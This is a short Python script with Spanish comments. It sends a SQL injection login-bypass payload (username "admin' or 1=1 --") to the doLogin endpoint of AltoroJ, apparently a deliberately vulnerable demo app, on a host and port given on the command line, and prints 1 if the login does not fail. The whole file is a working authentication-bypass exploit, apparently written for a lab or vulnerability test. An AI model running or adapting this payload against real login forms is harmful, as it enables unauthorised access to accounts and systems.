import requests
import json
import sys

# Verifica si se proporcionan 3 args
if len(sys.argv) != 3:
    print("Para usar el programa debes introducir 3 argumentos: python3 script.py <host> <port>")
    sys.exit(1)

host = sys.argv[1]
port = sys.argv[2]

url = 'http://' + host + ':' + port + '/AltoroJ/doLogin'

session = requests.Session()

username = "admin' or 1=1 --" 
password = "cualquierpassword"

payload = {
    "uid": username,
    "passw": password
}

headers = {
    'Content-Type': 'application/json'
}

response = session.post(url, data=payload)

if 'Failed' in response.text: 
    print("0")
else:
    print("1")

